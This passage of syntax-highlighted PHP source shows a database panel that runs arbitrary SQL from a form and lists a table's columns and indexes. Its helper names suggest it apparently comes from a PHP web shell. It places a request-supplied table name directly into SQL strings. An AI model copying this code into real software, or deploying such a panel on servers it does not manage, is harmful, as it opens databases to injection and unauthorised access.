<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> ($<span style="color: #e7c547;">tablename</span> &amp;&amp; !$<span style="color: #e7c547;">sql_query</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">sql_query</span> = <span style="color: #70c0b1;">"SELECT * FROM $tablename"</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">getnumsql</span> = $<span style="color: #e7c547;">sql_query</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">sql_query</span> = $<span style="color: #e7c547;">sql_query</span>.<span style="color: #70c0b1;">" LIMIT $start_limit, $pagenum"</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">allowedit</span> = <span style="color: #eaeaea; background-color: #000000;">1</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;form action="'</span>.$<span style="color: #e7c547;">self</span>.<span style="color: #70c0b1;">'" method="POST"&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;p&gt;&lt;table width="200" border="0" cellpadding="0" cellspacing="0"&gt;</span><span style="color: #70c0b1; text-decoration: underline;">&lt;tr&gt;&lt;td colspan="2"&gt;Run SQL query/queries on database '</span><span style="text-decoration: underline;">.$</span><span style="color: #e7c547; text-decoration: underline;">dbname</span><span style="text-decoration: underline;">.</span><span style="color: #70c0b1; text-decoration: underline;">':&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;textarea name="sql_query" class="area" style="width:600px;height:50px;overflow:auto;"&gt;'</span><span style="text-decoration: underline;">.</span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">htmlspecialchars(</span><span style="text-decoration: underline;">$</span><span style="color: #e7c547; text-decoration: underline;">sql_query</span><span style="text-decoration: underline;">,</span><span style="color: #7aa6da; text-decoration: underline;">ENT_QUOTES</span><span style="text-decoration: underline;">).</span><span style="color: #70c0b1; text-decoration: underline;">'&lt;/textarea&gt;&lt;/td&gt;&lt;td style="padding:0 5px;"&gt;&lt;input class="bt" style="height:50px;" name="submit" type="submit" value="Query" /&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/p&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makehide(</span><span style="color: #70c0b1;">'tablename'</span>, $<span style="color: #e7c547;">tablename</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makehide(</span><span style="color: #70c0b1;">'action'</span>,<span style="color: #70c0b1;">'mysqladmin'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span>$<span style="color: #e7c547;">dbform</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;/form&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> ($<span style="color: #e7c547;">tablename</span> || ($<span style="color: #e7c547;">runquery</span> &amp;&amp; $<span style="color: #e7c547;">sql_query</span>)) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> ($<span style="color: #e7c547;">doing</span> == <span style="color: #70c0b1;">'structure'</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">result</span> = <span style="color: #eaeaea; background-color: #000000;">q(</span><span style="color: #70c0b1;">"SHOW FULL COLUMNS FROM $tablename"</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">rowdb</span> = <span style="color: #eaeaea; background-color: #000000;">array(</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">while</span>($<span style="color: #e7c547;">row</span> = <span style="color: #eaeaea; background-color: #000000;">mysql_fetch_array(</span>$<span style="color: #e7c547;">result</span>)) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">rowdb</span>[] = $<span style="color: #e7c547;">row</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;h3&gt;Structure&lt;/h3&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;table border="0" cellpadding="3" cellspacing="0"&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;tr class="head"&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td&gt;Field&lt;/td&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td&gt;Type&lt;/td&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td&gt;Collation&lt;/td&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td&gt;Null&lt;/td&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td&gt;Key&lt;/td&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td&gt;Default&lt;/td&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td&gt;Extra&lt;/td&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td&gt;Privileges&lt;/td&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td&gt;Comment&lt;/td&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;/tr&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">foreach</span> ($<span style="color: #e7c547;">rowdb</span> <span style="color: #b9ca4a;">as</span> $<span style="color: #e7c547;">row</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">thisbg</span> = <span style="color: #eaeaea; background-color: #000000;">bg(</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;tr class="'</span>.$<span style="color: #e7c547;">thisbg</span>.<span style="color: #70c0b1;">'" onmouseover="this.className=\</span><span style="color: #70c0b1; text-decoration: underline;">'focus\';" onmouseout="this.className=\''</span><span style="text-decoration: underline;">.$</span><span style="color: #e7c547; text-decoration: underline;">thisbg</span><span style="text-decoration: underline;">.</span><span style="color: #70c0b1; text-decoration: underline;">'\';"&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td&gt;'</span>.$<span style="color: #e7c547;">row</span>[<span style="color: #70c0b1;">'Field'</span>].<span style="color: #70c0b1;">'&lt;/td&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td&gt;'</span>.$<span style="color: #e7c547;">row</span>[<span style="color: #70c0b1;">'Type'</span>].<span style="color: #70c0b1;">'&lt;/td&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td&gt;'</span>.$<span style="color: #e7c547;">row</span>[<span style="color: #70c0b1;">'Collation'</span>].<span style="color: #70c0b1;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td&gt;'</span>.$<span style="color: #e7c547;">row</span>[<span style="color: #70c0b1;">'Null'</span>].<span style="color: #70c0b1;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td&gt;'</span>.$<span style="color: #e7c547;">row</span>[<span style="color: #70c0b1;">'Key'</span>].<span style="color: #70c0b1;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td&gt;'</span>.$<span style="color: #e7c547;">row</span>[<span style="color: #70c0b1;">'Default'</span>].<span style="color: #70c0b1;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td&gt;'</span>.$<span style="color: #e7c547;">row</span>[<span style="color: #70c0b1;">'Extra'</span>].<span style="color: #70c0b1;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td&gt;'</span>.$<span style="color: #e7c547;">row</span>[<span style="color: #70c0b1;">'Privileges'</span>].<span style="color: #70c0b1;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td&gt;'</span>.$<span style="color: #e7c547;">row</span>[<span style="color: #70c0b1;">'Comment'</span>].<span style="color: #70c0b1;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;/tr&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">tbfoot(</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">result</span> = <span style="color: #eaeaea; background-color: #000000;">q(</span><span style="color: #70c0b1;">"SHOW INDEX FROM $tablename"</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">rowdb</span> = <span style="color: #eaeaea; background-color: #000000;">array(</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">while</span>($<span style="color: #e7c547;">row</span> = <span style="color: #eaeaea; background-color: #000000;">mysql_fetch_array(</span>$<span style="color: #e7c547;">result</span>)) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">rowdb</span>[] = $<span style="color: #e7c547;">row</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;h3&gt;Indexes&lt;/h3&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;table border="0" cellpadding="3" cellspacing="0"&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;tr class="head"&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td&gt;Keyname&lt;/td&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td&gt;Type&lt;/td&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td&gt;Unique&lt;/td&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td&gt;Packed&lt;/td&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td&gt;Seq_in_index&lt;/td&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td&gt;Field&lt;/td&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td&gt;Cardinality&lt;/td&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td&gt;Collation&lt;/td&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td&gt;Null&lt;/td&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td&gt;Comment&lt;/td&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;/tr&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">foreach</span> ($<span style="color: #e7c547;">rowdb</span> <span style="color: #b9ca4a;">as</span> $<span style="color: #e7c547;">row</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">thisbg</span> = <span style="color: #eaeaea; background-color: #000000;">bg(</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;tr class="'</span>.$<span style="color: #e7c547;">thisbg</span>.<span style="color: #70c0b1;">'" onmouseover="this.className=\</span><span style="color: #70c0b1; text-decoration: underline;">'focus\';" onmouseout="this.className=\''</span><span style="text-decoration: underline;">.$</span><span style="color: #e7c547; text-decoration: underline;">thisbg</span><span style="text-decoration: underline;">.</span><span style="color: #70c0b1; text-decoration: underline;">'\';"&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td&gt;'</span>.$<span style="color: #e7c547;">row</span>[<span style="color: #70c0b1;">'Key_name'</span>].<span style="color: #70c0b1;">'&lt;/td&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td&gt;'</span>.$<span style="color: #e7c547;">row</span>[<span style="color: #70c0b1;">'Index_type'</span>].<span style="color: #70c0b1;">'&lt;/td&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td&gt;'</span>.($<span style="color: #e7c547;">row</span>[<span style="color: #70c0b1;">'Non_unique'</span>] ? <span style="color: #70c0b1;">'No'</span> : <span style="color: #70c0b1;">'Yes'</span>).<span style="color: #70c0b1;">'&amp;nbsp;&lt;/td</span><span style="color: #70c0b1; text-decoration: underline;">&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td&gt;'</span>.($<span style="color: #e7c547;">row</span>[<span style="color: #70c0b1;">'Packed'</span>] === <span style="color: #7aa6da;">null</span> ? <span style="color: #70c0b1;">'No'</span> : $<span style="color: #e7c547;">row</span>[<span style="color: #70c0b1;">'Packed'</span><span style="text-decoration: underline;">]).</span><span style="color: #70c0b1; text-decoration: underline;">'&amp;nbsp;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td&gt;'</span>.$<span style="color: #e7c547;">row</span>[<span style="color: #70c0b1;">'Seq_in_index'</span>].<span style="color: #70c0b1;">'&lt;/td&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td&gt;'</span>.$<span style="color: #e7c547;">row</span>[<span style="color: #70c0b1;">'Column_name'</span>].($<span style="color: #e7c547;">row</span>[<span style="color: #70c0b1;">'Sub_part'</span>] ? <span style="color: #70c0b1;">'('</span>.$<span style="color: #e7c547;">ro</span><span style="color: #e7c547; text-decoration: underline;">w</span><span style="text-decoration: underline;">[</span><span style="color: #70c0b1; text-decoration: underline;">'Sub_part'</span><span style="text-decoration: underline;">].</span><span style="color: #70c0b1; text-decoration: underline;">')'</span><span style="text-decoration: underline;"> : </span><span style="color: #70c0b1; text-decoration: underline;">''</span><span style="text-decoration: underline;">).</span><span style="color: #70c0b1; text-decoration: underline;">'&amp;nbsp;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td&gt;'</span>.($<span style="color: #e7c547;">row</span>[<span style="color: #70c0b1;">'Cardinality'</span>] ? $<span style="color: #e7c547;">row</span>[<span style="color: #70c0b1;">'Cardinality'</span>] : <span style="color: #eaeaea; background-color: #000000;">0</span>)<span style="text-decoration: underline;">.</span><span style="color: #70c0b1; text-decoration: underline;">'&amp;nbsp;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td&gt;'</span>.$<span style="color: #e7c547;">row</span>[<span style="color: #70c0b1;">'Collation'</span>].<span style="color: #70c0b1;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td&gt;'</span>.$<span style="color: #e7c547;">row</span>[<span style="color: #70c0b1;">'Null'</span>].<span style="color: #70c0b1;">'&amp;nbsp;&lt;/td&gt;'</span>);
